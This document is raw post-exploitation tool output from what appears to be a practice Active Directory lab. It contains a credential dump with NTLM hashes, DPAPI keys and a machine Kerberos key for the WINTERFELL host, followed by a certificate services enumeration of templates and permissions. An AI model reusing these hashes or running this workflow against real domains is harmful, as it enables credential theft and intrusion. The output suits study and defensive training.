	credman :

Authentication Id : 0 ; 497891066 (00000000:1dad36fa)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/13/2025 10:08:00 AM
SID               : S-1-5-90-0-2
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 497889360 (00000000:1dad3050)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/13/2025 10:08:00 AM
SID               : S-1-5-96-0-2
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 387630392 (00000000:171ac538)
Session           : Batch from 0
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 1/9/2025 4:51:27 PM
SID               : S-1-5-21-58534182-3680670537-1634125476-1113
	msv :
	 [00000003] Primary
	 * Username : robb.stark
	 * Domain   : NORTH
	 * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
	 * SHA1     : 3bea28f1c440eed7be7d423cefebb50322ed7b6c
	 * DPAPI    : 654a782dcc73985918057bda38970cc4
	tspkg :
	wdigest :
	 * Username : robb.stark
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : robb.stark
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 62293 (00000000:0000f355)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:26 PM
SID               : S-1-5-90-0-1
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:26 PM
SID               : S-1-5-19
	msv :
	tspkg :
	wdigest :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :
	credman :

Authentication Id : 0 ; 40180 (00000000:00009cf4)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:26 PM
SID               : S-1-5-96-0-1
	msv :
	 [00000003] Primary
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * NTLM     : 8a647d60877c8743dccb8ff2aa18a060
	 * SHA1     : cc89e83a306f285bf1a9a55d1c97b11917104040
	 * DPAPI    : cc89e83a306f285bf1a9a55d1c97b119
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : WINTERFELL$
	 * Domain   : north.sevenkingdoms.local
	 * Password : f0 16 7b e2 91 3f ad a5 94 bc c3 24 68 8a 52 0b 13 7d db 1b e4 72 ae 09 37 0b 62 43 3f a0 bf fb e2 0f e5 1a ee 76 31 6d 16 98 1a 83 60 57 28 d2 e3 91 95 20 85 04 cc 70 42 e2 d0 cf bc 2d 1d f0 de 06 8b 70 b9 0e 3f 30 43 64 4e 6d f7 99 91 f9 7c 05 63 dc 16 39 91 da 3d 64 e8 c0 34 2b 86 1e fe 0e 26 ee b0 6f 50 94 2a aa b9 0d 45 37 b1 37 e6 bf 1d c2 46 1d 2b bd 7d ea 20 68 fb 07 25 19 e0 f4 e3 b0 9f cf d2 e1 a5 8a 02 4e 7d 49 ad 8c e7 bd e0 f7 0a 9b 20 ed f5 40 61 5b b3 ff f5 90 dc d5 99 61 08 34 3d 45 14 ad 54 0a 51 56 00 e1 5e d3 4e e7 69 a4 37 6e 89 1f a8 20 3a 83 71 b2 b3 e2 8f 3d 04 bb 21 27 c6 8b 4d 4b 45 63 2c 2e 6f aa d8 1d 70 4f 69 29 c5 2d 0d 8b 7e 80 87 4d 6e 72 fe 34 e5 8d 5b 37 ad a2 62 f6 a6 c8 7e 78
	ssp :
	credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WINTERFELL$
Domain            : NORTH
Logon Server      : (null)
Logon Time        : 12/30/2024 6:07:24 PM
SID               : S-1-5-18
	msv :
	tspkg :
	wdigest :
	 * Username : WINTERFELL$
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :
	 * Username : winterfell$
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :
	credman :
```

---------------------------

`sa-adcs-enum`

```bash
Enterprise CA Name        : SEVENKINGDOMS-CA
  DNS Hostname              : kingslanding.sevenkingdoms.local
  Flags                     : SUPPORTS_NT_AUTHENTICATION CA_SERVERTYPE_ADVANCED
  Expiration                : 1 years
  CA Cert                   :
    Subject Name            : DC=local, DC=sevenkingdoms, CN=SEVENKINGDOMS-CA
    Thumbprint              : 6dc77450a3a8b6e9eb6b95d4518ef9089a4fb422
    Serial Number           : d1fd926c1ef28545a213d4aa083ca332
    Start Date              : 12/18/2024 11:11:18
    End Date                : 12/18/2029 11:21:17
    Chain                   : DC=local, DC=sevenkingdoms, CN=SEVENKINGDOMS-CA
  Permissions               :
    Owner                   : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00000100
          Flags             : 00000001
          Flags             : 00000001
                              Extended right {0E10C968-78FB-11D2-90D4-00C04F79DC55}
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
          Flags             : 00000501
                              Read Rights
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\KINGSLANDING$
          Access mask       : 000F00FF
          Flags             : 00000501
                              Read Rights
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094
          Flags             : 00000101
                              Read Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F01FF
          Flags             : 00000501
                              Read Rights
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F01BD
          Flags             : 00000501
                              Read Rights
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights

  [*] Found 11 templates on the ca

    Template Name           : DirectoryEmailReplication
    Friendly Name           : Directory Email Replication
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.29
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_ALT_REQUIRE_DNS SUBJECT_ALT_REQUIRE_DIRECTORY_GUID
    Enrollment Flags        : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Directory Service Email Replication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : DomainControllerAuthentication
    Friendly Name           : Domain Controller Authentication
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.28
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_ALT_REQUIRE_DNS
    Enrollment Flags        : AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Client Authentication, Server Authentication, Smart Card Logon
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : KerberosAuthentication
    Friendly Name           : Kerberos Authentication
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.33
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_ALT_REQUIRE_DNS SUBJECT_ALT_REQUIRE_DOMAIN_DNS
    Enrollment Flags        : AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Client Authentication, Server Authentication, Smart Card Logon, KDC Authentication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : EFSRecovery
    Friendly Name           : EFS Recovery Agent
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.8
    Validity Period         : 5 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_REQUIRE_DIRECTORY_PATH SUBJECT_ALT_REQUIRE_UPN
    Enrollment Flags        : INCLUDE_SYMMETRIC_ALGORITHMS AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : File Recovery
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : EFS
    Friendly Name           : Basic EFS
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.6
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_REQUIRE_DIRECTORY_PATH SUBJECT_ALT_REQUIRE_UPN
    Enrollment Flags        : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Encrypting File System
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Users
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : DomainController
    Friendly Name           : Domain Controller
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.15
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_REQUIRE_DNS_AS_CN SUBJECT_ALT_REQUIRE_DNS SUBJECT_ALT_REQUIRE_DIRECTORY_GUID
    Enrollment Flags        : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Client Authentication, Server Authentication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Enterprise Read-only Domain Controllers
          Access mask       : 00000110
          Flags             : 00000001
                              Enrollment Rights
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Controllers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : WebServer
    Friendly Name           : Web Server
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.16
    Validity Period         : 2 years
    Renewal Period          : 6 weeks
    Name Flags              : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Flags        :
    Signatures Required     : 0
    Extended Key Usage      : Server Authentication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : Machine
    Friendly Name           : Computer
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.14
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_REQUIRE_DNS_AS_CN SUBJECT_ALT_REQUIRE_DNS
    Enrollment Flags        : AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Client Authentication, Server Authentication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Computers
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : User
    Friendly Name           : User
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.1
    Validity Period         : 1 years
    Renewal Period          : 6 weeks
    Name Flags              : SUBJECT_REQUIRE_DIRECTORY_PATH SUBJECT_REQUIRE_EMAIL SUBJECT_ALT_REQUIRE_EMAIL SUBJECT_ALT_REQUIRE_UPN
    Enrollment Flags        : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS AUTO_ENROLLMENT
    Signatures Required     : 0
    Extended Key Usage      : Encrypting File System, Secure Email, Client Authentication
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Users
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : NT AUTHORITY\Authenticated Users
          Access mask       : 00020094

    Template Name           : SubCA
    Friendly Name           : Subordinate Certification Authority
    Template OID            : 1.3.6.1.4.1.311.21.8.2260163.8227625.3820688.8764020.8205761.141.1.18
    Validity Period         : 5 years
    Renewal Period          : 6 weeks
    Name Flags              : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Flags        :
    Signatures Required     : 0
    Extended Key Usage      : N/A
    Permissions             :
      Owner                 : SEVENKINGDOMS\Enterprise Admins
                              S-1-5-21-3848810514-1890589760-83533814-519
      Access Rights         :
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 00000130
          Flags             : 00000001
                              Enrollment Rights
                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
        Principal           : SEVENKINGDOMS\Domain Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
        Principal           : SEVENKINGDOMS\Enterprise Admins
          Access mask       : 000F00FF
                              WriteOwner Rights
                              WriteDacl Rights
                              WriteProperty All Rights
